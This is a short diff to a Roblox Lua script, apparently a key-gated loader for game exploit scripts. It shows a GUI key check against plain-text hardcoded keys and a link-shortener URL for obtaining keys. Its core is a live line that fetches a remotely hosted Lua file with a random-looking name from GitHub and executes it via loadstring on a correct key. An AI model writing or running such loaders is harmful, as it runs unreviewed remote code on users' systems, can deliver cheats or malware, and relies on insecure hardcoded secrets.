@@ -6,11 +6,10 @@ local input = game:GetService("UserInputService")
 local runn
 local device = ""
 
-local link = "https://ify.ac/1XTq"
+local link = "https://ify.ac/1XUz"
 
 local KEYS = {
-      ADMIN = "GETOUT",
-      USERS = "ro02klsfse"
+      {Admin = "GETOUT", USERS = "sgrserfwer21"}
 }
 
 local GUI = Instance.new("ScreenGui")
@@ -247,7 +246,7 @@ uischeckbutton.Transparency = 0.2
 
 CHECKBUTTON.MouseButton1Click:Connect(function()
       for _, a in pairs(KEYS) do
-            if KEYINPUT.Text == a then
+            if KEYINPUT.Text == a.Admin or KEYINPUT.Text == a.USERS then
                   loadstring(game:HttpGet("https://raw.githubusercontent.com/populyar12345/dontworry/refs/heads/main/sdkfheshiehfshiuh.lua"))()
                   GUI:Destroy()
             else
